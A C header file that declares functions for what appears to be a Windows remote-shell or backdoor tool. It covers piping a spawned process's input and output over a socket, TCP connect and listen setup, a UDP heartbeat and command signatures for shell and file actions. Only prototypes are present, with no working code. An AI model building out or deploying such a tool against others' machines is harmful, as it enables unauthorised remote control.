#ifndef _INCLUDES_
#define _INCLUDES_

#include "cfg.h"
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include <time.h>
#include <signal.h>


extern const char _SIG_INIT[2];
extern const char _SIG_FILE[2];
extern const char _SIG_COUT[2];
extern const char _SIG_SHLL[2];
extern const char _SIG_HRBT[2];

/* --- UTILS --- */

void DBGLG(char buf[], ...);
int MatchSig(char buf[2]);
int WinsockInitialized(void);
int InitSetup(void);


/* --- OS --- */

int ScanOutPipe(HANDLE hStdoutRd, OVERLAPPED* readOverlapped, SOCKET sockt);
int WriteInPipe(HANDLE hStdinWr, OVERLAPPED* writeOverlapped,  SOCKET sockt);
int Shell(PROCESS_INFORMATION pi, SOCKET sock);


/* --- TCP --- */

int IpSetupINIT(struct addrinfo** _ad_info, char* ip);
int Connect(SOCKET* ConnectSocket, struct addrinfo* ad_info);
int SetupSocketTCP(struct addrinfo **ad_info);
int SetupServerTCP(SOCKET* ListenSocket);


/* --- UDP --- */

int SetupServerUDP(SOCKET* _socku);
int SetupHeartBeatUDP(SOCKET* _socku, struct sockaddr_in* _ad_info, const char* ip);
int HeartBeat(const char* ip, HANDLE* killme);

#endif
